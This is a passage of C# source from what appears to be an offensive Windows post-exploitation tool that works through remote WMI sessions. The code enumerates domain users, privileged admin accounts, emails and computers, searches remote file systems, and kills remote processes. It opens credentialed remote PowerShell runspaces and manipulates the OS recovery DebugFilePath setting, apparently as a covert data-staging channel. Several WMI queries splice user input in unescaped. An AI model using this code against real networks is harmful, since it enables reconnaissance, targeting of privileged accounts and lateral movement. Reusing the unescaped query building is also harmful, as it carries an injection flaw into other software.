                var email = wmiObject["DS_mail"]?.ToString();

                //table.AddRow(name, accountDescription, email);
                table.AddRow(name, accountDescription, email, lastLogon, lastPasswdSet, isAdmin.ToString());

            }
            //table.Write();
            Messenger.Info(table.ToString());

            return queryCollection;
        }

        public object ls_domain_admins(Planter planter)
        {
            var queryCollection = get_domain_users_collection(planter);

            if (queryCollection == null)
                return null;

            var table = new ConsoleTable("Name", "Description", "Email", "Last Logon", "PasswordLastSet").Configure(o => o.NumberAlignment = ConsoleTables.Alignment.Right);

            foreach (var o in queryCollection)
            {
                var wmiObject = (ManagementObject)o;

                var name = wmiObject["DS_sAMAccountName"]?.ToString();


                if (name != null && (name.StartsWith("$")))
                    continue;

                if (name != null && (name.StartsWith("HealthMailbox") && name.Length == 20))
                    continue;

                if (name != null && (name.StartsWith("SM_") && name.Length == 20))
                    continue;

                var isAdmin = IsDomainAdmin(wmiObject["DS_memberOf"]);
                if (!isAdmin)
                    continue;


                var dSDescriptionArr = Helpers.ToArray(wmiObject["DS_description"]);
                var accountDescription = string.Empty;
                if (dSDescriptionArr != null && dSDescriptionArr.Length > 0)
                    accountDescription = dSDescriptionArr[0];

                long.TryParse(wmiObject["DS_lastLogon"]?.ToString(), out var lastLogonStr);
                var lastLogon = Helpers.ParseAdDateTime(lastLogonStr);

                long.TryParse(wmiObject["DS_pwdLastSet"]?.ToString(), out var lastPasswddSetStr);
                var lastPasswdSet = Helpers.ParseAdDateTime(lastPasswddSetStr);

                var email = wmiObject["DS_mail"]?.ToString();

                

                table.AddRow(name, accountDescription, email, lastLogon, lastPasswdSet);

            }

            //table.Write();
            Messenger.Info(table.ToString());

            return queryCollection;
        }


        public object ls_user_groups(Planter planter)
        {
            var queryCollection = get_domain_users_collection(planter);

            if (queryCollection == null)
                return null;

            var table = new ConsoleTable("Name", "Member of").Configure(o => o.NumberAlignment = ConsoleTables.Alignment.Right);

            foreach (var o in queryCollection)
            {
                var wmiObject = (ManagementObject)o;

                var name = wmiObject["DS_sAMAccountName"]?.ToString();


                if (name != null && (name.StartsWith("$")))
                    continue;

                if (name != null && (name.StartsWith("HealthMailbox") && name.Length == 20))
                    continue;

                if (name != null && (name.StartsWith("SM_") && name.Length == 20))
                    continue;

                var userGroups = ParseUserGroupNames(wmiObject["DS_memberOf"]);
                if (string.IsNullOrEmpty(userGroups))
                    continue;



                table.AddRow(name, userGroups);

            }
            //table.Write();
            Messenger.Info(table.ToString());

            return queryCollection;
        }


        public object ls_computers(Planter planter)
        {
            var queryCollection = get_domain_computers(planter);

            if (queryCollection == null)
                return null;

            var table = new ConsoleTable("Name", "DNS", "OS", "OS Ver",  "Distinguished Name", "Managed By", "Description").Configure(o => o.NumberAlignment = ConsoleTables.Alignment.Right);

            foreach (var o in queryCollection)
            {
                var wmiObject = (ManagementObject)o;

                var name = wmiObject["DS_name"]?.ToString();
                var hostname = wmiObject["DS_dNSHostName"]?.ToString();
                var distinguishedName = wmiObject["DS_distinguishedName"]?.ToString();
                var os = wmiObject["DS_operatingSystem"]?.ToString();
                var osVer = wmiObject["DS_operatingSystemVersion"]?.ToString();

                var managedByS = wmiObject["DS_managedBy"]?.ToString();
                var managedBy = string.Empty;

                if (!string.IsNullOrEmpty(managedByS))
                {
                    managedBy = managedByS.Split(',')[0].Trim().Replace("CN=", "").TrimEnd(',').TrimStart(',');
                }

                var descriptionArr = ToIEnumerable(wmiObject["DS_description"]);
                var description = string.Empty;

                if (descriptionArr != null)
                {
                    foreach (var s in descriptionArr)
                    {
                        description += $"{s}, ";
                    }

                    description = description.Trim().TrimEnd(' ').Trim(',');
                }

                table.AddRow(name, hostname, os, osVer, distinguishedName, managedBy, description);
            }

            //table.Write();
            Messenger.Info(table.ToString());

            return queryCollection;
        }


        public object ls_domain_users_list(Planter planter)
        {
            var queryCollection = get_domain_users_collection(planter);
            if (queryCollection == null)
                return null;

            foreach (var o in queryCollection)
            {
                var wmiObject = (ManagementObject)o;

                var name = wmiObject["DS_sAMAccountName"]?.ToString();


                if (string.IsNullOrEmpty(name))
                    continue;

                if ((name.StartsWith("$")))
                    continue;

                if (name.StartsWith("HealthMailbox") && name.Length == 20)
                    continue;

                if (name.StartsWith("SM_") && name.Length == 20)
                    continue;

                Messenger.Info(name);
            }

            return queryCollection;
        }

        public object ls_domain_users_email(Planter planter)
        {
            var queryCollection = get_domain_users_collection(planter);
            if (queryCollection == null)
                return null;

            foreach (var o in queryCollection)
            {
                var wmiObject = (ManagementObject)o;

                var name = wmiObject["DS_sAMAccountName"]?.ToString();

                if (string.IsNullOrEmpty(name))
                    continue;

                if ((name.StartsWith("$")))
                    continue;

                if (name.StartsWith("HealthMailbox") && name.Length == 20)
                    continue;

                if (name.StartsWith("SM_") && name.Length == 20)
                    continue;

                var mail = wmiObject["DS_mail"]?.ToString();

                if (string.IsNullOrEmpty(mail))
                    continue;

                Messenger.Info(mail);
            }

            return queryCollection;
        }


        private ManagementObjectCollection get_domain_users_collection(Planter planter)
        {

            var scope = planter.Connector.ConnectedWmiSession;

            var query = new ObjectQuery("SELECT * FROM ds_user");
            var searcher = new ManagementObjectSearcher(scope, query);
            var queryCollection = searcher.Get();
            return queryCollection;
        }


        private ManagementObjectCollection get_domain_computers(Planter planter)
        {

            var scope = planter.Connector.ConnectedWmiSession;

            var query = new ObjectQuery("SELECT * FROM ds_computer");
            var searcher = new ManagementObjectSearcher(scope, query);
            var queryCollection = searcher.Get();
            return queryCollection;
        }


        public object ls_domain_groups(Planter planter)
        {
            var scope = planter.Connector.ConnectedWmiSession;

            var query = new ObjectQuery("SELECT * FROM ds_group");
            var searcher = new ManagementObjectSearcher(scope, query);
            var queryCollection = searcher.Get();

            Messenger.Info("{0,-30}", "Group Name");
            Messenger.Info("{0,-30}", "----------------");

            foreach (var o in queryCollection)
            {
                var wmiObject = (ManagementObject)o;

                Messenger.Info("{0,-20}", wmiObject["DS_sAMAccountName"]);
            }

            return queryCollection;
        }
      

        #endregion


        #endregion


        #region Internal functions

        private string ParseUserGroupNames(object userGroupsObj)
        {
            if (userGroupsObj == null)
                return string.Empty;

            var userGroups = ToIEnumerable(userGroupsObj);
            if (userGroups == null)
                return string.Empty;

            var result = string.Empty;
            foreach (string userGroup in userGroups)
            {
                var w = userGroup.Split(',');

                foreach (var s in w)
                {
                    var a = s.Trim().TrimEnd('.');
                    if (a.StartsWith("DC="))
                        continue;

                    if (a.StartsWith("OU="))
                        continue;

                    a = a.Replace("CN=", "");
                    result = $"{result}, {a}";
                }
            }

            return result.Trim().TrimStart(',').TrimEnd(',');
        }

        private bool IsDomainAdmin(object userGroupsObj)
        {
            if (userGroupsObj == null)
                return false;

            var userGroups = ToIEnumerable(userGroupsObj);
            if (userGroups == null)
                return false;

            foreach (string m in userGroups)
            {
                if (string.IsNullOrEmpty(m))
                    continue;

                if (m.Contains("CN=Administrators"))
                {
                    return true;
                }

                if (m.Contains("CN=Domain Admins"))
                {
                    return true;

                }
                if (m.Contains("CN=Enterprise Admins"))
                {
                    return true;
                }
                if (m.Contains("CN=Schema Admins"))
                {
                    return true;
                }
            }

            return false;
        }
     
        private ManagementObjectCollection ProcessFileSearchRequest(Planter planter, string basePath=null)
        {
            var scope = planter.Connector.ConnectedWmiSession;
            
            // base path to search
            var path = planter.Commander.Directory;
            if (!string.IsNullOrEmpty(basePath) && !string.IsNullOrWhiteSpace(basePath))
                path = basePath;


            // file name
            var file = planter.Commander.File;

            ///////// Will probably have to add more tests in here in case the user decides to do some funny business ///////////
            var drive = path.Substring(0, 2);
            string fileName;

            //Build it vs sending in ObjectQuery so we can modify it accordingly (add extension qualifier and whatnot)
            var queryString = $"SELECT * FROM CIM_DataFile WHERE Drive='{drive}'";

            if (!path.EndsWith("\\"))
            {
                path += "\\";
            }
            var newPath = path.Remove(0, 2).Replace("\\", "\\\\");

            //Check to see if the user want's to search the whole drive (will be slow, extra resource consumption.)
            if (path == "\\\\")
            {
                //
            }
            else
            {
                queryString += $" AND Path='{newPath}'";
            }


            //Parse the file so we can modify the search accordingly
            if (!string.IsNullOrEmpty(Path.GetExtension(file)))
            {
                var extension = Path.GetExtension(file);
                extension = extension.Remove(0, 1); //remove the dot from the extension
                fileName = Path.GetFileNameWithoutExtension(file);
                queryString += $" AND Extension='{extension}'";
            }
            else
                fileName = file;

            //Parse for * sent in filename
            if (fileName.Contains("*"))
                fileName = fileName.Replace("*", "%");

            if (!string.IsNullOrEmpty(fileName))
                queryString += $" AND FileName LIKE '{fileName}'";

            var fileQuery = new ObjectQuery(queryString);
            var fileSearcher = new ManagementObjectSearcher(scope, fileQuery);
            var queryCollection = fileSearcher.Get();


            return queryCollection;
        }

        private ManagementObjectCollection ls_file(Planter planter, bool print = false)
        {
            var scope = planter.Connector.ConnectedWmiSession;
            var path = planter.Commander.Directory;

            var drive = path.Substring(0, 2);

            if (!path.EndsWith("\\"))
            {
                path += "\\";
            }
            var newPath = path.Remove(0, 2).Replace("\\", "\\\\");

            var fileQuery = new ObjectQuery($"SELECT * FROM CIM_DataFile Where Drive='{drive}' AND Path='{newPath}' ");
            var fileSearcher = new ManagementObjectSearcher(scope, fileQuery);
            var queryCollection = fileSearcher.Get();

            if (!print)
                return queryCollection;

            Messenger.Info("{0,-30}", "Files");
            Messenger.Info("{0,-30}", "-----------------");
            foreach (var o in queryCollection)
            {
                var wmiObject = (ManagementObject)o;
   
                // Write all files to screen
                Messenger.Info("{0}", Path.GetFileName((string)wmiObject["Name"]));
            }

            return queryCollection;
        }

        private ManagementObjectCollection ls_dir(Planter planter, bool print = false)
        {
            var scope = planter.Connector.ConnectedWmiSession;
            var path = planter.Commander.Directory;

            ObjectQuery folderQuery;
            if (path.Contains("*"))
            {
                var newPath = path;

                var p = path.Remove(0, 2);
                if (p.StartsWith("\\\\"))
                {
                    //newPath = path.Replace("\\\\", "\\");
                }
                else
                {
                    newPath = p.Replace("\\", "\\\\");
                }


                if (newPath.Contains("*"))
                {
                    newPath = newPath.Replace("*", "%");
                }
                else
                {
                    newPath += "%";
                }

                folderQuery = new ObjectQuery($"SELECT * FROM Win32_Directory Where Name LIKE '{newPath}'");
            }
            else
            {
                var drive = path.Substring(0, 2);

                if (!path.EndsWith("\\"))
                {
                    path += "\\";
                }
                var newPath = path.Remove(0, 2).Replace("\\", "\\\\");

                //folderQuery = new ObjectQuery($"SELECT * FROM Win32_Directory Where Drive='{drive}' AND Path='{newPath}' ");
                folderQuery = new ObjectQuery($"SELECT * FROM Win32_Directory Where Drive='{drive}' AND Path='{newPath}' ");
            }
               


            var folderSearcher = new ManagementObjectSearcher(scope, folderQuery);
            var folderQueryCollection = folderSearcher.Get();

            if (!print)
                return folderQueryCollection;

            Messenger.Info("\n{0,-30}", "Folders");
            Messenger.Info("{0,-30}", "-----------------");
            foreach (var o in folderQueryCollection)
            {
                var wmiObject = (ManagementObject)o;
                Messenger.Info("{0}", Path.GetFileName((string)wmiObject["Name"]));// String
            }

            return folderQueryCollection;
        }


        private object KillProc(string handle, string procName, ManagementScope scope)
        {
            try
            {
                var pather = new ManagementPath($"Win32_Process.Handle='{handle}'");
                var classInstance = new ManagementObject(scope, pather, null);

                // Obtain in-parameters for the method
                var inParams = classInstance.GetMethodParameters("Terminate");

                // Execute the method and obtain the return values.
                var outParams = classInstance.InvokeMethod("Terminate", inParams, null);

                if (outParams != null && Convert.ToUInt32(outParams["ReturnValue"]) == 0)
                {
                    Messenger.Info("Successfully killed '{0}'", procName);
                    return true;
                }

                Messenger.RedMessage("[-] Error: Not able to kill process: " + procName);
                return false;
            }
            catch (Exception e)
            {
                Messenger.RedMessage("[-] Error killing process: " + procName);
                Messenger.Info(e);
                return false;
            }
        }

        private Runspace RunspaceCreate(Planter planter)
        {
            try
            {
                if (planter.Password == null)
                {
                    var remoteComputerUri = new Uri($"http://{planter.System}:5985/WSMAN");
                    var connectionInfo = new WSManConnectionInfo(remoteComputerUri);
                    var remoteRunspace = RunspaceFactory.CreateRunspace(connectionInfo);
                    remoteRunspace.Open();
                    return remoteRunspace;
                }

                var domainCredz = planter.Domain + "\\" + planter.User;
                var remoteComputer = new Uri($"http://{planter.System}:5985/wsman");
                var creds = new PSCredential(domainCredz, planter.Password);
                var connection = new WSManConnectionInfo(remoteComputer, null, creds);

                var runspace = RunspaceFactory.CreateRunspace(connection);
                runspace.Open();
                return runspace;

            }

            catch (System.Management.Automation.Remoting.PSRemotingTransportException)
            {
                Messenger.YellowMessage("[*] Issue creating PS runspace, the machine might not be accepting WSMan connections for a number of reasons," +
                    " trying process create method...\n");
                throw new System.Management.Automation.Remoting.PSRemotingTransportException();
            }

            catch (Exception e)
            {
                Messenger.RedMessage("[-] Error creating PS runspace");
                Messenger.Info(e);
                return null;
            }
        }

        private Runspace RunspaceCreateLocal()
        {
            try
            {
                var localRunspace = RunspaceFactory.CreateRunspace();
                localRunspace.Open();
                return localRunspace;
            }
            catch (System.Management.Automation.Remoting.PSRemotingTransportException)
            {
                Messenger.YellowMessage("[*] Issue creating PS runspace, the machine might not be accepting WSMan connections for a number of reasons, trying process create method...\n");
                throw new System.Management.Automation.Remoting.PSRemotingTransportException();
            }
            catch (Exception e)
            {
                Messenger.RedMessage("[-] Error creating PS runspace");
                Messenger.Info(e);
                return null;
            }
        }

        private string GetOsRecovery(ManagementScope scope)
        {
            // Grab the original WMI Property so we can set it back afterwards
            string originalWmiProperty = null;

            var query = new ObjectQuery("SELECT * FROM Win32_OSRecoveryConfiguration");
            var searcher = new ManagementObjectSearcher(scope, query);
            var queryCollection = searcher.Get();

            foreach (var o in queryCollection)
            {
                var wmiObject = (ManagementObject)o;
                originalWmiProperty = wmiObject["DebugFilePath"].ToString();
            }

            return originalWmiProperty;
        }

        public static void SetOsRecovery(ManagementScope scope, string originalWmiProperty)
        {
            // Set the original WMI Property
            var query = new ObjectQuery("SELECT * FROM Win32_OSRecoveryConfiguration");
            var searcher = new ManagementObjectSearcher(scope, query);
            var queryCollection = searcher.Get();

            foreach (var o in queryCollection)
            {
                var wmiObject = (ManagementObject)o;
                if (wmiObject["DebugFilePath"] != null)
                {
                    wmiObject["DebugFilePath"] = originalWmiProperty;
                    wmiObject.Put();
                }
            }
        }

        private bool CheckForFile(string path, ManagementScope scoper, bool verbose)
        {
            var newPath = path.Replace("\\", "\\\\");

            var query = new ObjectQuery($"SELECT * FROM CIM_DataFile Where Name='{newPath}' ");
            var searcher = new ManagementObjectSearcher(scoper, query);
            var queryCollection = searcher.Get();

            foreach (var o in queryCollection)
            {
                var wmiObject = (ManagementObject)o;
                if (Convert.ToInt32(wmiObject["FileSize"]) == 0)
                {
                    Messenger.RedMessage("[-] Error: The file is present but zero bytes, no contents to display");
                    return false;
                }
            }

            if (queryCollection.Count == 0)
            {
                if (verbose)
                    Messenger.RedMessage("[-] Specified file does not exist, not running PS runspace");
                return false;
            }

            return true;
        }

        private void CheckForFinishedDebugFilePath(string originalWmiProperty, ManagementScope scoper)
        {
            var breakLoop = false;
            var warn = false;
            var counter = 0;

            do
            {
                var modifiedRecovery = GetOsRecovery(scoper);
                if (modifiedRecovery == originalWmiProperty)
                {
                    Messenger.YellowMessage("DebugFilePath write not completed, sleeping for 10s...");
                    Thread.Sleep(10000);
                    warn = true;
                    counter++;
                    if (counter > 12)
                    {
                        // We only want to run for 2 mins max
                        breakLoop = true;
                    }
                }
                else
                {
                    if (warn) //I only want this if the warning gets thrown so it stays pretty
                        Messenger.Info("\n\n");

                    breakLoop = true;
                }
            }
            while (!breakLoop);
        }

        private bool IsNullOrEmpty(Array array)
        {
            return (array == null || array.Length == 0);
        }

        private string Truncate(string value, int maxLength)
        {
            if (string.IsNullOrEmpty(value)) return value;
            return value.Length <= maxLength ? value : value.Substring(0, maxLength);
        }

        private static string RandomString(int length)
        {
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
            return new string(Enumerable.Repeat(chars, length).Select(s => s[Random.Next(s.Length)]).ToArray());
        }

        private IEnumerable ToIEnumerable(object obj)
        {
            return obj as IEnumerable;
        }

        #endregion

    }
}
